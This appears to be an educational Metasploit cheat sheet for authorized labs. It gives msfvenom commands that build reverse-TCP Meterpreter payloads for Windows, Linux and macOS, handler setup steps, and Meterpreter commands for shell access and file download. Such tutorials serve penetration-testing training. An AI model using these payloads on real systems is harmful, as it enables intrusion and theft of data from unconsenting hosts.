
````markdown
# 🚀 Cross-Platform Reverse Shell Guide

> **A practical Metasploit quick-reference guide** for authorized penetration testing and isolated lab environments.
>
> Learn how to identify your local IP address, generate platform-specific payloads with `msfvenom`, configure a Metasploit handler, and navigate an established Meterpreter session.

---

## 📑 Table of Contents

- [1. Finding Your Local IP Address](#1-finding-your-local-ip-address)
- [2. Payload Generation](#2-payload-generation)
  - [Windows](#-windows)
  - [Linux](#-linux)
  - [macOS — Apple Silicon](#-macos--apple-silicon)
- [3. Setting Up the Metasploit Handler](#3-setting-up-the-metasploit-handler)
- [4. Meterpreter Command Reference](#4-meterpreter-command-reference)
- [⚠️ Safety and Authorization](#️-safety-and-authorization)

---

## 1. Finding Your Local IP Address

Before configuring a payload, identify the IP address of the machine that will run the Metasploit listener.

### 🐧 Linux

```bash
ip a
```

### 🍎 macOS

```bash
ipconfig getifaddr en0
```

### 🪟 Windows

Run this in **Command Prompt** or **PowerShell**:

```powershell
ipconfig
```

> **💡 Note:** Choose the correct network interface. Your loopback address (`127.0.0.1`) generally cannot be used to reach a listener from another machine.

---

## 2. Payload Generation

Use the appropriate payload and output format for the target operating system.

**Before running a command:** Replace `<YOUR_IP>` with your listener's IP address and `<YOUR_PORT>` with your chosen listening port, such as `4444`.

### 🪟 Windows

**Payload:** Meterpreter over reverse TCP  
**Output format:** PowerShell command

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  lhost=<YOUR_IP> \
  lport=<YOUR_PORT> \
  -f psh-cmd > psh.bat
```

### 🐧 Linux

**Payload:** 64-bit Linux Meterpreter over reverse TCP  
**Output format:** ELF executable

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  lhost=<YOUR_IP> \
  lport=<YOUR_PORT> \
  -f elf > payload.elf
```

For an authorized Linux lab target, executable permissions may be required:

```bash
chmod +x payload.elf
```

### 🍎 macOS — Apple Silicon

**Payload:** ARM64 macOS Meterpreter over reverse TCP  
**Output format:** Mach-O binary

```bash
msfvenom -p osx/aarch64/meterpreter/reverse_tcp \
  lhost=<YOUR_IP> \
  lport=<YOUR_PORT> \
  -f macho > payload.macho
```

For an authorized macOS lab target, executable permissions may be required:

```bash
chmod +x payload.macho
```

---

## 3. Setting Up the Metasploit Handler

Start the Metasploit Framework console:

```bash
msfconsole
```

Select the multi-handler module:

```text
use exploit/multi/handler
```

Configure the handler to match the payload used in your lab.

### Windows

```text
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT <YOUR_PORT>
```

### Linux

```text
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT <YOUR_PORT>
```

### macOS — Apple Silicon

```text
set PAYLOAD osx/aarch64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT <YOUR_PORT>
```

Once configured, start the handler:

```text
exploit
```

> **Important:** The handler's payload type, `LHOST`, and `LPORT` must match the corresponding lab payload configuration.

---

## 4. Meterpreter Command Reference

Once an authorized lab session is established, use the following commands to explore the Meterpreter interface.

| Command | Purpose |
|---|---|
| `help` | Display available commands and their descriptions. |
| `sysinfo` | Display operating system and system information. |
| `getuid` | Show the identity associated with the session. |
| `pwd` | Print the current working directory. |
| `ls` | List files and directories. |
| `shell` | Open an interactive system shell, where supported. |
| `background` | Background the current session and return to Metasploit. |

### 📁 File-Transfer Commands

Meterpreter also provides file-transfer functionality. Use it only with files and systems you are explicitly authorized to access.

| Command | Purpose |
|---|---|
| `download` | Transfer an authorized file from the remote session to your machine. |
| `upload` | Transfer an authorized file from your machine to the remote session. |

To explore additional commands and options, use:

```text
help
```

---

## ⚠️ Safety and Authorization

This guide is intended for **educational use, authorized penetration testing, and isolated cybersecurity labs**.

- Obtain explicit permission before testing any system.
- Use intentionally vulnerable virtual machines or other controlled lab targets.
- Do not execute generated payloads on systems without authorization.
- Keep lab environments isolated and remove test artifacts when finished.

**Learn responsibly. Test legally. Secure what you build.** 🔐

---

<p align="center">
  <sub>📚 Cybersecurity Learning Notes · Metasploit Framework · Authorized Lab Use Only</sub>
</p>
````
